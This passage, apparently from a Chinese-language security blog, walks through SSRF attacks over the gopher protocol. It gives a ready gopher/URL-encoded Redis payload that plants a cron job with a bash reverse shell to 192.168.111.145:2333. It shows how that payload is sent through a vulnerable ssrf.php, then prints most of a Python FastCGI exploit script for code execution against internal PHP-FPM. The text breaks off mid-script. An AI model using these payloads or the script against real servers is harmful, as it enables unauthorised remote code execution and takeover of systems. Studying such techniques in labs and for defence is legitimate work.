class="line">            <span class="built_in">line</span> = <span class="built_in">line</span>.<span class="built_in">replace</span>(<span class="string">'\n'</span>, <span class="string">''</span>)</span><br><span class="line">            <span class="built_in">exp</span> = <span class="built_in">exp</span> + <span class="built_in">line</span></span><br><span class="line">print <span class="built_in">exp</span></span><br></pre></td></tr></table></figure><p>运行脚本进行转换<code>python redis_gopher.py redis.txt</code><br><img src="https://i.loli.net/2019/05/04/5ccd8dc075fa7.png" alt><br>转换的格式为<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*<span class="number">3</span>%<span class="number">0</span>d%<span class="number">0</span>a$<span class="number">3</span>%<span class="number">0</span>d%<span class="number">0</span>aset%<span class="number">0</span>d%<span class="number">0</span>a$<span class="number">1</span>%<span class="number">0</span>d%<span class="number">0</span>a1%<span class="number">0</span>d%<span class="number">0</span>a$<span class="number">62</span>%<span class="number">0</span>d%<span class="number">0</span>a%<span class="number">0</span>a%<span class="number">0</span>a*/<span class="number">1</span> * * * * bash -i &gt;&amp; /dev/tcp/<span class="number">192.168</span><span class="number">.111</span><span class="number">.145</span>/<span class="number">2333</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span>%<span class="number">0</span>a%<span class="number">0</span>a%<span class="number">0</span>a%<span class="number">0</span>d%<span class="number">0</span>a*<span class="number">4</span>%<span class="number">0</span>d%<span class="number">0</span>a$<span class="number">6</span>%<span class="number">0</span>d%<span class="number">0</span>aconfig%<span class="number">0</span>d%<span class="number">0</span>a$<span class="number">3</span>%<span class="number">0</span>d%<span class="number">0</span>aset%<span class="number">0</span>d%<span class="number">0</span>a$<span class="number">3</span>%<span class="number">0</span>d%<span class="number">0</span>adir%<span class="number">0</span>d%<span class="number">0</span>a$<span class="number">16</span>%<span class="number">0</span>d%<span class="number">0</span>a/var/spool/cron/%<span class="number">0</span>d%<span class="number">0</span>a*<span class="number">4</span>%<span class="number">0</span>d%<span class="number">0</span>a$<span class="number">6</span>%<span class="number">0</span>d%<span class="number">0</span>aconfig%<span class="number">0</span>d%<span class="number">0</span>a$<span class="number">3</span>%<span class="number">0</span>d%<span class="number">0</span>aset%<span class="number">0</span>d%<span class="number">0</span>a$<span class="number">10</span>%<span class="number">0</span>d%<span class="number">0</span>adbfilename%<span class="number">0</span>d%<span class="number">0</span>a$<span class="number">4</span>%<span class="number">0</span>d%<span class="number">0</span>aroot%<span class="number">0</span>d%<span class="number">0</span>a*<span class="number">1</span>%<span class="number">0</span>d%<span class="number">0</span>a$<span class="number">4</span>%<span class="number">0</span>d%<span class="number">0</span>asave%<span class="number">0</span>d%<span class="number">0</span>a*<span class="number">1</span>%<span class="number">0</span>d%<span class="number">0</span>a$<span class="number">4</span>%<span class="number">0</span>d%<span class="number">0</span>aquit%<span class="number">0</span>d%<span class="number">0</span>a%<span class="number">0</span>a</span><br></pre></td></tr></table></figure></p><p>此时可本地通过curl验证，返回五个<code>ok</code>,即我们前面的五条命令执行成功。<br><img src="https://i.loli.net/2019/05/04/5ccd8e0513c86.png" alt><br>此时回到一个存到ssrf的web页面<br>将上面的padload进行url编码<br><img src="https://i.loli.net/2019/05/04/5ccd8ea49ec3d.png" alt><br>然后添加到漏洞页面，进行访问即可<br><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">http</span>://192.168.111.149/ssrf.php?url=gopher<span class="number">%3</span>A<span class="number">%2</span>F<span class="number">%2</span>F127.0.0.1<span class="number">%3</span>A6379<span class="number">%2</span>F_*3<span class="number">%250</span>d<span class="number">%250</span>a<span class="number">%243</span><span class="number">%250</span>d<span class="number">%250</span>aset<span class="number">%250</span>d<span class="number">%250</span>a<span class="number">%241</span><span class="number">%250</span>d<span class="number">%250</span>a1<span class="number">%250</span>d<span class="number">%250</span>a<span class="number">%2462</span><span class="number">%250</span>d<span class="number">%250</span>a<span class="number">%250</span>a<span class="number">%250</span>a*<span class="number">%2</span>F1<span class="number">%20</span>*<span class="number">%20</span>*<span class="number">%20</span>*<span class="number">%20</span>*<span class="number">%20</span>bash<span class="number">%20</span>-i<span class="number">%20</span><span class="number">%3</span>E<span class="number">%26</span><span class="number">%20</span><span class="number">%2</span>Fdev<span class="number">%2</span>Ftcp<span class="number">%2</span>F192.168.111.145<span class="number">%2</span>F2333<span class="number">%200</span><span class="number">%3</span>E<span class="number">%261</span><span class="number">%250</span>a<span class="number">%250</span>a<span class="number">%250</span>a<span class="number">%250</span>d<span class="number">%250</span>a*4<span class="number">%250</span>d<span class="number">%250</span>a<span class="number">%246</span><span class="number">%250</span>d<span class="number">%250</span>aconfig<span class="number">%250</span>d<span class="number">%250</span>a<span class="number">%243</span><span class="number">%250</span>d<span class="number">%250</span>aset<span class="number">%250</span>d<span class="number">%250</span>a<span class="number">%243</span><span class="number">%250</span>d<span class="number">%250</span>adir<span class="number">%250</span>d<span class="number">%250</span>a<span class="number">%2416</span><span class="number">%250</span>d<span class="number">%250</span>a<span class="number">%2</span>Fvar<span class="number">%2</span>Fspool<span class="number">%2</span>Fcron<span class="number">%2</span>F<span class="number">%250</span>d<span class="number">%250</span>a*4<span class="number">%250</span>d<span class="number">%250</span>a<span class="number">%246</span><span class="number">%250</span>d<span class="number">%250</span>aconfig<span class="number">%250</span>d<span class="number">%250</span>a<span class="number">%243</span><span class="number">%250</span>d<span class="number">%250</span>aset<span class="number">%250</span>d<span class="number">%250</span>a<span class="number">%2410</span><span class="number">%250</span>d<span class="number">%250</span>adbfilename<span class="number">%250</span>d<span class="number">%250</span>a<span class="number">%244</span><span class="number">%250</span>d<span class="number">%250</span>aroot<span class="number">%250</span>d<span class="number">%250</span>a*1<span class="number">%250</span>d<span class="number">%250</span>a<span class="number">%244</span><span class="number">%250</span>d<span class="number">%250</span>asave<span class="number">%250</span>d<span class="number">%250</span>a*1<span class="number">%250</span>d<span class="number">%250</span>a<span class="number">%244</span><span class="number">%250</span>d<span class="number">%250</span>aquit<span class="number">%250</span>d<span class="number">%250</span>a<span class="number">%250</span>a</span><br></pre></td></tr></table></figure></p><p>如果漏洞页面有回显，也可看到返回五个<code>ok</code><br><img src="https://i.loli.net/2019/05/04/5ccd8f30275f9.png" alt><br>此时在服务器监听端口即可收到反弹的shell<br><img src="https://i.loli.net/2019/05/04/5ccd8f7566cbf.png" alt></p><h2 id="0x05-gopher协议攻击内网PHP-FPM"><a href="#0x05-gopher协议攻击内网PHP-FPM" class="headerlink" title="0x05 gopher协议攻击内网PHP-FPM"></a>0x05 gopher协议攻击内网PHP-FPM</h2><p>PHP-FRM是一个fastcgi协议解析器，Nginx等服务器中间件将用户请求按照fastcgi的规则打包好后通过TCP传<br>送给FRM进行解析。当FRM可以未授权访问时，可以通过构造fastcgi协议包发送给FRM.以实现任意代码执行。漏洞具体成因可以查看p神的文章<a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html</a></p><p>当PHP-FRM以tcp模式运行时，会监听本地一个端口（默认为9000）用于接收来自Nginx等服务器中间件发送的请求<br><img src="https://i.loli.net/2019/05/05/5ccecff9c445b.png" alt><br>我们构造该请求，并且可以转换为<code>gopher</code>协议支持的方式，当外网web页面存在ssrf漏洞并且支持gopher协议时，即可利用<code>gopher</code>协议利用内网PHP-FRM执行任意代码。<br>首先附上前人编写的exp<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br></pre></td><td class="code"><pre><span class="line">import socket</span><br><span class="line">import base64</span><br><span class="line">import random</span><br><span class="line">import argparse</span><br><span class="line">import sys</span><br><span class="line">from io import BytesIO</span><br><span class="line">import urllib</span><br><span class="line"><span class="comment"># Referrer: https://github.com/wuyunfeng/Python-FastCGI-Client</span></span><br><span class="line"></span><br><span class="line">PY2 = True <span class="keyword">if</span> sys.version_info.major == <span class="number">2</span> <span class="keyword">else</span> False</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bchr</span><span class="params">(i)</span></span><span class="symbol">:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="symbol">PY2:</span></span><br><span class="line">        <span class="keyword">return</span> force_bytes(chr(i))</span><br><span class="line">    <span class="symbol">else:</span></span><br><span class="line">        <span class="keyword">return</span> bytes([i])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bord</span><span class="params">(c)</span></span><span class="symbol">:</span></span><br><span class="line">    <span class="keyword">if</span> isinstance(c, int)<span class="symbol">:</span></span><br><span class="line">        <span class="keyword">return</span> c</span><br><span class="line">    <span class="symbol">else:</span></span><br><span class="line">        <span class="keyword">return</span> ord(c)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">force_bytes</span><span class="params">(s)</span></span><span class="symbol">:</span></span><br><span class="line">    <span class="keyword">if</span> isinstance(s, bytes)<span class="symbol">:</span></span><br><span class="line">        <span class="keyword">return</span> s</span><br><span class="line">    <span class="symbol">else:</span></span><br><span class="line">        <span class="keyword">return</span> s.encode(<span class="string">'utf-8'</span>, <span class="string">'strict'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">force_text</span><span class="params">(s)</span></span><span class="symbol">:</span></span><br><span class="line">    <span class="keyword">if</span> issubclass(type(s), str)<span class="symbol">:</span></span><br><span class="line">        <span class="keyword">return</span> s</span><br><span class="line">    <span class="keyword">if</span> isinstance(s, bytes)<span class="symbol">:</span></span><br><span class="line">        s = str(s, <span class="string">'utf-8'</span>, <span class="string">'strict'</span>)</span><br><span class="line">    <span class="symbol">else:</span></span><br><span class="line">        s = str(s)</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FastCGIClient</span>:</span></span><br><span class="line">    <span class="string">""</span><span class="string">"A Fast-CGI Client for Python"</span><span class="string">""</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># private</span></span><br><span class="line">    __FCGI_VERSION = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    __FCGI_ROLE_RESPONDER = <span class="number">1</span></span><br><span class="line">    __FCGI_ROLE_AUTHORIZER = <span class="number">2</span></span><br><span class="line">    __FCGI_ROLE_FILTER = <span class="number">3</span></span><br><span class="line"></span><br><span class="line">    __FCGI_TYPE_BEGIN = <span class="number">1</span></span><br><span class="line">    __FCGI_TYPE_ABORT = <span class="number">2</span></span><br><span class="line">    __FCGI_TYPE_END = <span class="number">3</span></span><br><span class="line">    __FCGI_TYPE_PARAMS = <span class="number">4</span></span><br><span class="line">    __FCGI_TYPE_STDIN = <span class="number">5</span></span><br><span class="line">    __FCGI_TYPE_STDOUT = <span class="number">6</span></span><br><span class="line">    __FCGI_TYPE_STDERR = <span class="number">7</span></span><br><span class="line">    __FCGI_TYPE_DATA = <span class="number">8</span></span><br><span class="line">    __FCGI_TYPE_GETVALUES = <span class="number">9</span></span><br><span class="line">    __FCGI_TYPE_GETVALUES_RESULT = <span class="number">10</span></span><br><span class="line">    __FCGI_TYPE_UNKOWNTYPE = <span class="number">11</span></span><br><span class="line"></span><br><span class="line">    __FCGI_HEADER_SIZE = <span class="number">8</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># request state</span></span><br><span class="line">    FCGI_STATE_SEND = <span class="number">1</span></span><br><span class="line">    FCGI_STATE_ERROR = <span class="number">2</span></span><br><span class="line">    FCGI_STATE_SUCCESS = <span class="number">3</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(<span class="keyword">self</span>, host, port, timeout, keepalive)</span></span><span class="symbol">:</span></span><br><span class="line">        <span class="keyword">self</span>.host = host</span><br><span class="line">        <span class="keyword">self</span>.port = port</span><br><span class="line">        <span class="keyword">self</span>.timeout = timeout</span><br><span class="line">        <span class="keyword">if</span> <span class="symbol">keepalive:</span></span><br><span class="line">            <span class="keyword">self</span>.keepalive = <span class="number">1</span></span><br><span class="line">        <span class="symbol">else:</span></span><br><span class="line">            <span class="keyword">self</span>.keepalive = <span class="number">0</span></span><br><span class="line">        <span class="keyword">self</span>.sock = None</span><br><span class="line">        <span class="keyword">self</span>.requests = dict()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__connect</span><span class="params">(<span class="keyword">self</span>)</span></span><span class="symbol">:</span></span><br><span class="line">        <span class="keyword">self</span>.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        <span class="keyword">self</span>.sock.settimeout(<span class="keyword">self</span>.timeout)</span><br><span class="line">        <span class="keyword">self</span>.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line">        <span class="comment"># if self.keepalive:</span></span><br><span class="line">        <span class="comment">#     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 1)</span></span><br><span class="line">        <span class="comment"># else:</span></span><br><span class="line">        <span class="comment">#     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 0)</span></span><br><span class="line">        <span class="symbol">try:</span></span><br><span class="line">            <span class="keyword">self</span>.sock.connect((<span class="keyword">self</span>.host, int(<span class="keyword">self</span>.port)))</span><br><span class="line">        except socket.error as <span class="symbol">msg:</span></span><br><span class="line">            <span class="keyword">self</span>.sock.close()</span><br><span class="line">            <span class="keyword">self</span>.sock = None</span><br><span class="line">            print(repr(msg))</span><br><span class="line">            <span class="keyword">return</span> False</span><br><span class="line">        <span class="keyword">return</span> True</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__encodeFastCGIRecord</span><span class="params">(<span class="keyword">self</span>, fcgi_type, content, requestid)</span></span><span class="symbol">:</span></span><br><span class="line">        length = len(content)</span><br><span class="line">        buf = bchr(FastCGIClient.__FCGI_VERSION) \</span><br><span class="line">               + bchr(fcgi_type) \</span><br><span class="line">               + bchr((requestid <span class="meta">&gt;&gt; </span><span class="number">8</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">               + bchr(requestid &amp; <span class="number">0xFF</span>) \</span><br><span class="line">               + bchr((length <span class="meta">&gt;&gt; </span><span class="number">8</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">               + bchr(length &amp; <span class="number">0xFF</span>) \</span><br><span class="line">               + bchr(<span class="number">0</span>) \</span><br><span class="line">               + bchr(<span class="number">0</span>) \</span><br><span class="line">               + content</span><br><span class="line">        <span class="keyword">return</span> buf</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__encodeNameValueParams</span><span class="params">(<span class="keyword">self</span>, name, value)</span></span><span class="symbol">:</span></span><br><span class="line">        nLen = len(name)</span><br><span class="line">        vLen = len(value)</span><br><span class="line">        record = b<span class="string">''</span></span><br><span class="line">        <span class="keyword">if</span> nLen &lt; <span class="number">128</span><span class="symbol">:</span></span><br><span class="line">            record += bchr(nLen)</span><br><span class="line">        <span class="symbol">else:</span></span><br><span class="line">            record += bchr((nLen <span class="meta">&gt;&gt; </span><span class="number">24</span>) <span class="params">| 0x80) \</span></span><br><span class="line"><span class="params">                      + bchr((nLen &gt;&gt; 16) &amp; 0xFF) \</span></span><br><span class="line"><span class="params">                      + bchr((nLen &gt;&gt; 8) &amp; 0xFF) \</span></span><br><span class="line"><span class="params">                      + bchr(nLen &amp; 0xFF)</span></span><br><span class="line"><span class="params">        <span class="keyword">if</span> vLen &lt; 128:</span></span><br><span class="line"><span class="params">            record += bchr(vLen)</span></span><br><span class="line"><span class="params">        <span class="keyword">else</span>:</span></span><br><span class="line"><span class="params">            record += bchr((vLen &gt;&gt; 24) |</span> <span class="number">0x80</span>) \</span><br><span class="line">                      + bchr((vLen <span class="meta">&gt;&gt; </span><span class="number">16</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">                      + bchr((vLen <span class="meta">&gt;&gt; </span><span class="number">8</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">                      + bchr(vLen &amp; <span class="number">0xFF</span>)</span><br><span class="line">        <span class="keyword">return</span> record + name + value</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__decodeFastCGIHeader</span><span class="params">(<span class="keyword">self</span>, stream)</span></span><span class="symbol">:</span></span><br><span class="line">        header = dict()</span><br><span class="line">        header[<span class="string">'version'</span>] = bord(stream[<span class="number">0</span>])</span><br><span class="line">        header[<span class="string">'type'</span>] = bord(stream[<span class="number">1</span>])</span><br><span class="line">        header[<span class="string">'requestId'</span>] = (bord(stream[<span class="number">2</span>]) &lt;&lt; <span class="number">8</span>) + bord(stream[<span class="number">3</span>])</span><br><span class="line">        header[<span class="string">'contentLength'</span>] = (bord(stream[<span class="number">4</span>]) &lt;&lt; <span class="number">8</span>) + bord(stream[<span class="number">5</span>])</span><br><span class="line">        header[<span class="string">'paddingLength'</span>] = bord(stream[<span class="number">6</span>])</span><br><span class="line">        header[<span class="string">'reserved'</span>] = bord(stream[<span class="number">7</span>])</span><br><span class="line">        <span class="keyword">return</span> header</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__decodeFastCGIRecord</span><span class="params">(<span class="keyword">self</span>, buffer)</span></span><span class="symbol">:</span></span><br><span class="line">        header = buffer.read(int(<span class="keyword">self</span>.__FCGI_HEADER_SIZE))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="symbol">header:</span></span><br><span class="line">            <span class="keyword">return</span> False</span><br><span class="line">        <span class="symbol">else:</span></span><br><span class="line">            record = <span class="keyword">self</span>.__decodeFastCGIHeader(header)</span><br><span class="line">            record[<span class="string">'content'</span>] = b<span class="string">''</span></span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> <span class="string">'contentLength'</span> <span class="keyword">in</span> record.keys()<span class="symbol">:</span></span><br><span class="line">                contentLength = int(record[<span class="string">'contentLength'</span>])</span><br><span class="line">                record[<span class="string">'content'</span>] += buffer.read(contentLength)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">'paddingLength'</span> <span class="keyword">in</span> record.keys()<span class="symbol">:</span></span><br><span class="line">                skiped = buffer.read(int(record[<span class="string">'paddingLength'</span>]))</span><br><span class="line">            <span class="keyword">return</span> record</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">request</span><span class="params">(<span class="keyword">self</span>, nameValuePairs=&#123;&#125;, post=<span class="string">''</span>)</span></span><span class="symbol">:</span></span><br><span class="line">       <span class="comment"># if not self.__connect():</span></span><br><span class="line">        <span class="comment">#    print('connect failure! please check your fasctcgi-server !!')</span></span><br><span class="line">         <span class="comment">#   return</span></span><br><span class="line"></span><br><span class="line">        requestId = random.randint(<span class="number">1</span>, (<span class="number">1</span> &lt;&lt; <span class="number">16</span>) - <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">self</span>.requests[requestId] = dict()</span><br><span class="line">        request = b<span class="string">""</span></span><br><span class="line">        beginFCGIRecordContent = bchr(<span class="number">0</span>) \</span><br><span class="line">                                 + bchr(FastCGIClient.__FCGI_ROLE_RESPONDER) \</span><br><span class="line">                                 + bchr(<span class="keyword">self</span>.keepalive) \</span><br><span class="line">                                 + bchr(<span class="number">0</span>) * <span class="number">5</span></span><br><span class="line">        request += <span class="keyword">self</span>.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN,</span><br><span class="line">                                              beginFCGIRecordContent, requestId)</span><br><span class="line">        paramsRecord = b<span class="string">''</span></span><br><span class="line">        <span class="keyword">if</span> <span class="symbol">nameValuePairs:</span></span><br><span class="line">            <span class="keyword">for</span> (name, value) <span class="keyword">in</span> nameValuePairs.items()<span class="symbol">:</span></span><br><span class="line">                name = force_bytes(name)</span><br><span class="line">                value = force_bytes(value)</span><br><span class="line">                paramsRecord += <span class="keyword">self</span>.__encodeNameValueParams(name, value)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="symbol">paramsRecord:</span></span><br><span class="line">            request += <span class="keyword">self</span>.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId)</span><br><span class="line">        request += <span class="keyword">self</span>.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, b<span class="string">''</span>, requestId)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="symbol">post:</span></span><br><span class="line">            request += <span class="keyword">self</span>.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, force_bytes(post), requestId)</span><br><span class="line">        request += <span class="keyword">self</span>.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, b<span class="string">''</span>, requestId)</span><br><span class="line">        <span class="comment">#print base64.b64encode(request)</span></span><br><span class="line">        <span class="keyword">return</span> request</span><br><span class="line">        <span class="comment"># self.sock.send(request)</span></span><br><span class="line">        <span class="comment"># self.requests[requestId]['state'] = FastCGIClient.FCGI_STATE_SEND</span></span><br><span class="line">        <span class="comment"># self.requests[requestId]['response'] = b''</span></span><br><span class="line">        <span class="comment"># return self.__waitForResponse(requestId)</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__waitForResponse</span><span class="params">(<span class="keyword">self</span>, requestId)</span></span><span class="symbol">:</span></span><br><span class="line">        data = b<span class="string">''</span></span><br><span class="line">        <span class="keyword">while</span> <span class="symbol">True:</span></span><br><span class="line">            buf = <span class="keyword">self</span>.sock.recv(<span class="number">512</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> len(buf)<span class="symbol">:</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            data += buf</span><br><span class="line"></span><br><span class="line">        data = BytesIO(data)</span><br><span class="line">        <span class="keyword">while</span> <span class="symbol">True:</span></span><br><span class="line">            response = <span class="keyword">self</span>.__decodeFastCGIRecord(data)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> <span class="symbol">response:</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> response[<span class="string">'type'</span>] == FastCGIClient.__FCGI_TYPE_STDOUT \</span><br><span class="line">                    <span class="keyword">or</span> response[<span class="string">'type'</span>] == FastCGIClient.<span class="symbol">__FCGI_TYPE_STDERR:</span></span><br><span class="line">                <span class="keyword">if</span> response[<span class="string">'type'</span>] == FastCGIClient.<span class="symbol">__FCGI_TYPE_STDERR:</span></span><br><span class="line">                    <span class="keyword">self</span>.requests[<span class="string">'state'</span>] = FastCGIClient.FCGI_STATE_ERROR</span><br><span class="line">                <span class="keyword">if</span> requestId == int(response[<span class="string">'requestId'</span>])<span class="symbol">:</span></span><br><span class="line">                    <span class="keyword">self</span>.requests[requestId][<span class="string">'response'</span>] += response[<span class="string">'content'</span>]</span><br><span class="line">            <span class="keyword">if</span> response[<span class="string">'type'</span>] == FastCGIClient.<span class="symbol">FCGI_STATE_SUCCESS:</span></span><br><span class="line">                <span class="keyword">self</span>.requests[requestId]</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">self</span>.requests[requestId][<span class="string">'response'</span>]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__repr__</span><span class="params">(<span class="keyword">self</span>)</span></span><span class="symbol">:</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">"fastcgi connect host:&#123;&#125; port:&#123;&#125;"</span>.format(<span class="keyword">self</span>.host, <span class="keyword">self</span>.port)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name_<span class="number">_</span> == <span class="string">'__main__'</span><span class="symbol">:</span></span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">'Php-fpm code execution vulnerability client.'</span>)</span><br><span class="line">    parser.add_argument(<span class="string">'host'</span>, help=<span class="string">'Target host, such as 127.0.0.1'</span>)</span><br><span class="line">    parser.add_argument(<span class="string">'file'</span>, help=<span class="string">'A php file absolute path, such as 